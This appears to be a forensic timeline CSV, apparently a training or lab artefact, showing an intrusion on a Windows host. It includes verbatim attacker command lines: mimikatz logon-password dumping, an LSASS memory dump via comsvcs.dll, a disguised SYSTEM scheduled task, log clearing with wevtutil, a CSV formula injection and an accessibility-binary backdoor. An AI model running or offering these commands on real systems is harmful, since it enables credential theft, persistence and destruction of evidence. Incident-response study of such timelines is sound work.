datetime,timestamp_desc,source,source_long,message,parser,display_name,tag
2026-03-14T09:07:45.000000+00:00,Creation Time,FILE,NTFS $MFT,File created: C:\Users\Public\Downloads\mimikatz.exe,filestat,TSK:/Users/Public/Downloads/mimikatz.exe,
2026-03-14T09:08:02.900000+00:00,Last Access Time,LOG,WinPrefetch,"Prefetch [MIMIKATZ.EXE] was executed, run count 1",prefetch,OS:/Windows/Prefetch/MIMIKATZ.EXE-2A7E0011.pf,
2026-03-14T09:08:19.000000+00:00,Recorded Time,EVT,WinEVTX,"[4688 / 0x1250] A new process has been created. New Process Name: C:\Users\Public\Downloads\mimikatz.exe, Command Line: mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" exit",winevtx,TSK:/Windows/System32/winevt/Logs/Security.evtx,
2026-03-14T09:11:04.000000+00:00,Recorded Time,EVT,WinEVTX,"[4698 / 0x1256] A scheduled task was created. Task Name: \Microsoft\Windows\WindowsUpdate\SysHealthCheck, Command: C:\Windows\Temp\update_check.ps1",winevtx,TSK:/Windows/System32/winevt/Logs/Security.evtx,
2026-03-14T09:11:06.000000+00:00,Creation Time,FILE,NTFS $MFT,File created: C:\Windows\System32\Tasks\Microsoft\Windows\WindowsUpdate\SysHealthCheck,filestat,TSK:/Windows/System32/Tasks/Microsoft/Windows/WindowsUpdate/SysHealthCheck,
2026-03-14T09:12:40.000000+00:00,Recorded Time,EVT,WinEVTX,"[4688 / 0x1250] A new process has been created. Command Line: schtasks.exe /create /tn ""SysHealthCheck"" /tr ""powershell -ep bypass -f C:\Windows\Temp\update_check.ps1"" /sc minute /mo 30 /ru SYSTEM",winevtx,TSK:/Windows/System32/winevt/Logs/Security.evtx,
2026-03-14T09:15:22.000000+00:00,Creation Time,REG,Registry Key,"[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run] Value name: ""OneDriveSync"" data: C:\Users\jdoe\AppData\Roaming\onedrivesync.exe",winreg_default,TSK:/Users/jdoe/NTUSER.DAT,
2026-03-14T09:18:03.000000+00:00,Last Visited Time,WEBHIST,Chrome History,http://198.51.100.77:8443/gate.php (no title) [count: 41],chrome_27_history,OS:/Users/jdoe/AppData/Local/Google/Chrome/User Data/Default/History,
2026-03-14T09:20:59.000000+00:00,Recorded Time,EVT,WinEVTX,"[4688 / 0x1250] A new process has been created. Command Line: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 704 C:\Windows\Temp\lsass.dmp full",winevtx,TSK:/Windows/System32/winevt/Logs/Security.evtx,
2026-03-14T09:21:31.000000+00:00,Creation Time,FILE,NTFS $MFT,File created: C:\Windows\Temp\lsass.dmp,filestat,TSK:/Windows/Temp/lsass.dmp,
2026-03-14T09:26:14.000000+00:00,Recorded Time,EVT,WinEVTX,"[4720 / 0x1270] A user account was created. New Account: svc_backup, Caller: jdoe",winevtx,TSK:/Windows/System32/winevt/Logs/Security.evtx,
2026-03-14T09:26:20.000000+00:00,Recorded Time,EVT,WinEVTX,"[4732 / 0x1274] A member was added to a security-enabled local group. Group: Administrators, Member: svc_backup",winevtx,TSK:/Windows/System32/winevt/Logs/Security.evtx,
2026-03-14T09:33:47.000000+00:00,Recorded Time,EVT,WinEVTX,"[4688 / 0x1250] A new process has been created. Command Line: wevtutil.exe cl Security",winevtx,TSK:/Windows/System32/winevt/Logs/Security.evtx,
2026-03-14T09:33:49.000000+00:00,Recorded Time,EVT,WinEVTX,[1102 / 0x044e] The audit log was cleared. Subject User Name: svc_backup,winevtx,TSK:/Windows/System32/winevt/Logs/Security.evtx,
2026-03-14T09:34:05.000000+00:00,Recorded Time,EVT,WinEVTX,"[104 / 0x0068] The System log file was cleared. User: svc_backup",winevtx,TSK:/Windows/System32/winevt/Logs/System.evtx,
2026-03-14T09:40:11.000000+00:00,Content Modification Time,FILE,NTFS $MFT,"=cmd|' /C calc.exe'!A0 was written into C:\Users\jdoe\Documents\export.csv",filestat,TSK:/Users/jdoe/Documents/export.csv,
2026-03-14T09:41:00.000000+00:00,Creation Time,REG,Registry Key,"Registry value ""Debugger"" set on Image File Execution Options for sethc.exe",winreg_default,TSK:/Windows/System32/config/SOFTWARE,
2026-03-14T09:44:26.000000+00:00,Recorded Time,EVT,WinEVTX,"[7045 / 0x1b85] A service was installed in the system.
Service Name: PSEXESVC
Service File Name: C:\Windows\PSEXESVC.exe
Service Type: user mode service",winevtx,TSK:/Windows/System32/winevt/Logs/System.evtx,
2026-03-14T09:50:08.000000+00:00,Last Access Time,LOG,WinPrefetch,"Prefetch [PSEXESVC.EXE] was executed, run count 1",prefetch,OS:/Windows/Prefetch/PSEXESVC.EXE-3C9A0BD2.pf,
2026-03-14T10:02:17.000000+00:00,Content Modification Time,FILE,NTFS $MFT,File modified: C:\Users\jdoe\AppData\Local\Microsoft\Windows\INetCache\IE\index.dat,filestat,TSK:/Users/jdoe/AppData/Local/Microsoft/Windows/INetCache/IE/index.dat,
2026-03-14T10:05:51.000000+00:00,Recorded Time,REG,BAM,"[HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\bam\State\UserSettings] \Device\HarddiskVolume2\Windows\System32\cmd.exe",winreg_bam,TSK:/Windows/System32/config/SYSTEM,
2026-03-14T10:14:09.000000+00:00,Creation Time,LNK,Windows Shortcut,"[Empty description] Local path: C:\Users\jdoe\Desktop\Budget.xlsx",lnk,OS:/Users/jdoe/AppData/Roaming/Microsoft/Windows/Recent/Budget.lnk,
2026-03-14T10:22:35.000000+00:00,Recorded Time,EVT,WinEVTX,[7036 / 0x1b7c] The Print Spooler service entered the running state.,winevtx,TSK:/Windows/System32/winevt/Logs/System.evtx,
2026-03-14T10:31:44.000000+00:00,Content Modification Time,FILE,NTFS $MFT,File modified: C:\ProgramData\Microsoft\Windows Defender\Scans\mpenginedb.db,filestat,TSK:/ProgramData/Microsoft/Windows Defender/Scans/mpenginedb.db,
2026-03-14T10:48:02.000000+00:00,Recorded Time,EVT,WinEVTX,"[4634 / 0x121a] An account was logged off. Account Name: jdoe, Logon Type: 2",winevtx,TSK:/Windows/System32/winevt/Logs/Security.evtx,
2026-03-14T11:00:00.000000+00:00,Recorded Time,LOG,Windows Firewall Log,"ALLOW TCP 192.0.2.44 198.51.100.77 49871 8443 - SEND",winfirewall,OS:/Windows/System32/LogFiles/Firewall/pfirewall.log,
